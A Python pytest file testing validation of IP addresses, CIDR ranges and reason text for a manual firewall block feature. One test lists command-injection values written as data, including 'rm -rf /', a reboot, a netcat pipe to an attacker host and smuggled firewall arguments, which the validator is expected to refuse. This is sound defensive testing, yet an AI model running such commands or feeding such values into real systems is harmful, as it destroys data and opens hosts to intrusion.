"""Tests for the manual block input validation in :mod:`src.block_management`."""

from __future__ import annotations

import pytest

from src.block_management import (
    MAX_REASON_LENGTH,
    BlockRefused,
    clean_reason,
    parse_target,
    printable,
    target_text,
)


@pytest.mark.parametrize(
    "value, expected",
    [
        ("45.33.12.7", "45.33.12.7"),
        ("  45.33.12.7  ", "45.33.12.7"),
        ("45.33.12.7/32", "45.33.12.7"),
        ("45.33.12.0/24", "45.33.12.0/24"),
        ("45.33.0.0/16", "45.33.0.0/16"),
        ("2606:4700::1111", "2606:4700::1111"),
        ("2606:4700:0000:0000:0000:0000:0000:1111", "2606:4700::1111"),
        ("2606:4700::1111/128", "2606:4700::1111"),
        ("2606:4700::/48", "2606:4700::/48"),
        ("2606:4700:10::/64", "2606:4700:10::/64"),
    ],
)
def test_valid_targets_are_normalized(value: str, expected: str) -> None:
    assert target_text(parse_target(value)) == expected


@pytest.mark.parametrize(
    "value",
    [
        "",
        "   ",
        "not-an-ip",
        "45.33.12",
        "45.33.12.256",
        "45.33.12.7/33",
        "2606:4700::1::1",
        "45.33.12.7/",
        "/24",
        "45.33.12.7/24/24",
        "fe80::1%eth0",  # zone IDs aren't accepted
        "045.33.12.7",  # leading zeros are ambiguous (octal?), ipaddress refuses them too
    ],
)
def test_invalid_targets_are_refused(value: str) -> None:
    with pytest.raises(BlockRefused) as excinfo:
        parse_target(value)
    assert excinfo.value.rule == "invalid"


def test_host_bits_set_suggests_the_network() -> None:
    with pytest.raises(BlockRefused, match=r"did you mean 45\.33\.12\.0/24"):
        parse_target("45.33.12.7/24")


@pytest.mark.parametrize("value, widest", [("45.32.0.0/15", 16), ("45.0.0.0/8", 16), ("0.0.0.0/0", 16),
                                           ("2606:4700::/47", 48), ("2606::/16", 48), ("::/0", 48)])
def test_oversized_ranges_are_refused(value: str, widest: int) -> None:
    with pytest.raises(BlockRefused, match=f"at most /{widest}") as excinfo:
        parse_target(value)
    assert excinfo.value.rule == "range_too_large"


@pytest.mark.parametrize(
    "value",
    [
        "45.33.12.7; rm -rf /",
        "45.33.12.7 && reboot",
        "45.33.12.7 | nc attacker 4444",
        "$(reboot)",
        "`id`",
        "45.33.12.7\nremoteip=any",
        "45.33.12.7 dir=out",
        "45.33.12.7\x00",
        "'45.33.12.7'",
        "-j ACCEPT",
        "45.33.12.7 -j ACCEPT",
    ],
)
def test_injection_attempts_never_get_past_validation(value: str) -> None:
    with pytest.raises(BlockRefused) as excinfo:
        parse_target(value)
    assert excinfo.value.rule == "invalid"
    # the message shows the input with control characters neutralized
    assert "\n" not in str(excinfo.value) and "\x00" not in str(excinfo.value)


def test_overlong_input_is_refused_without_echoing_all_of_it() -> None:
    with pytest.raises(BlockRefused) as excinfo:
        parse_target("1" * 10_000)
    assert len(str(excinfo.value)) < 200


def test_reason_is_plain_text() -> None:
    assert clean_reason("  port scanner \n from\tthe  outside ") == "port scanner from the outside"
    assert clean_reason("bell\x07 and nul\x00 and bidi‮ override") == "bell and nul and bidi override"
    assert clean_reason("") == ""
    # markup isn't special here -- it's kept as text and escaped wherever shown
    assert clean_reason("<b>bold</b>") == "<b>bold</b>"


def test_reason_length_limit() -> None:
    assert clean_reason("x" * MAX_REASON_LENGTH) == "x" * MAX_REASON_LENGTH
    with pytest.raises(BlockRefused) as excinfo:
        clean_reason("x" * (MAX_REASON_LENGTH + 1))
    assert excinfo.value.rule == "reason_too_long"


def test_printable_strips_control_characters_and_truncates() -> None:
    assert printable("a\r\nb\x1b[31mc", 64) == "a b [31mc"
    assert printable("x" * 100, 10) == "x" * 10
